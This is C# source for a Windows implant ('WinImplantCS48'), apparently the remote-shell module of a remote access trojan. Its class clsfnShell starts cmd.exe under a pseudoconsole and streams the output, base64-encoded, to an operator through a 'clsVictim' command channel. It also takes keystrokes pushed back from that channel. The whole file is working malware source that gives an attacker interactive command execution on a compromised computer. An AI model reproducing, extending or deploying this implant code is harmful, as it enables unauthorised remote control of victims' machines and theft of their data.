using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms.VisualStyles;

namespace WinImplantCS48
{
    public class clsfnShell : IDisposable
    {
        //ConPTY
        private IntPtr m_hPC = IntPtr.Zero; //PseudoConsole

        //Pipes
        private SafeFileHandle m_hPipeInWrite;
        private SafeFileHandle m_hPipeOutRead;

        //Process
        private IntPtr m_hProcess = IntPtr.Zero;
        private IntPtr m_hThread = IntPtr.Zero;

        //Thread
        private bool m_bIsRunning = false;
        private Thread m_thread;

        //Callback
        public Action<byte[]> actOnOutput;

        private clsVictim m_victim { get; set; }

        public clsfnShell(clsVictim victim)
        {
            m_victim = victim;

            actOnOutput += (byte[] abData) =>
            {
                m_victim.fnSendCommand(new string[]
                {
                    "shell",
                    "output",
                    Convert.ToBase64String(abData),
                });
            };
        }

        public void Dispose() => fnStop();

        public void fnStart()
        {
            int nCols = 80;
            int nRows = 24;

            clsWin32.clsKernel32.CreatePipe(out var inRead, out m_hPipeInWrite, IntPtr.Zero, 0);
            clsWin32.clsKernel32.CreatePipe(out m_hPipeOutRead, out var outWrite, IntPtr.Zero, 0);

            clsWin32.COORD size;
            size.X = (short)nCols;
            size.Y = (short)nRows;

            int hr = clsWin32.clsKernel32.CreatePseudoConsole(size, inRead.DangerousGetHandle(), outWrite.DangerousGetHandle(), 0, out m_hPC);

            if (hr != 0)
            {

                return;
            }

            fnStartProcessWithConPTY("cmd.exe /Q /K");

            m_bIsRunning = true;
            m_thread = new Thread(fnReadLoop) { IsBackground = true };
            m_thread.Start();
        }

        public void fnStartProcessWithConPTY(string szCommand)
        {
            var siEx = new clsWin32.STARTUPINFOEX();
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);

            IntPtr lpSize = IntPtr.Zero;
            clsWin32.clsKernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            clsWin32.clsKernel32.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

            clsWin32.clsKernel32.UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                0,
                (IntPtr)clsWin32.clsKernel32.PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                m_hPC,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
            );

            bool bRet = clsWin32.clsKernel32.CreateProcessW(
                null,
                szCommand,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                clsWin32.clsKernel32.EXTENDED_STARTUPINFO_PRESENT,
                IntPtr.Zero,
                null,
                ref siEx,
                out clsWin32.PROCESS_INFORMATION pi
            );

            fnPushInput(Encoding.ASCII.GetBytes("echo HELLO_FROM_CMD\n"));
            fnPushInput(Encoding.ASCII.GetBytes("echo READY\n"));

            if (!bRet)
            {

                return;
            }

            m_hProcess = pi.hProcess;
            m_hThread = pi.hThread;

            clsWin32.clsKernel32.DeleteProcThreadAttributeList(siEx.lpAttributeList);
            Marshal.FreeHGlobal(siEx.lpAttributeList);
        }

        private void fnReadLoop()
        {
            var abBuffer = new byte[4096];
            while (m_bIsRunning)
            {
                if (!clsWin32.clsKernel32.ReadFile(m_hPipeOutRead, abBuffer, abBuffer.Length, out int nRead, IntPtr.Zero))
                    break;

                if (nRead > 0)
                {
                    var abData = new byte[nRead];
                    Buffer.BlockCopy(abBuffer, 0, abData, 0, nRead);

                    actOnOutput?.Invoke(abData);
                }
            }
        }

        public void fnStop()
        {
            m_bIsRunning = false;
            m_thread?.Join();

            if (m_hPC != IntPtr.Zero)
                clsWin32.clsKernel32.ClosePseudoConsole(m_hPC);

            m_hPipeInWrite?.Dispose();
            m_hPipeOutRead?.Dispose();

            if (m_hProcess != IntPtr.Zero)
                clsWin32.clsKernel32.CloseHandle(m_hProcess);
            if (m_hThread != IntPtr.Zero)
                clsWin32.clsKernel32.CloseHandle(m_hThread);
        }

        public void fnPushInput(byte[] abData)
        {
            if (!m_bIsRunning)
                return;

            if (abData.Length == 1 && abData[0] == (byte)'\n')
                abData = Encoding.ASCII.GetBytes("\r\n");

            clsWin32.clsKernel32.WriteFile(m_hPipeInWrite, abData, abData.Length, out _, IntPtr.Zero);
        }

        public void fnResize(int nCol, int nRow)
        {
            if (m_hPC == IntPtr.Zero)
                return;

            clsWin32.COORD size;
            size.X = (short)nCol;
            size.Y = (short)nRow;

            clsWin32.clsKernel32.ResizePseudoConsole(m_hPC, size);
        }
    }
}
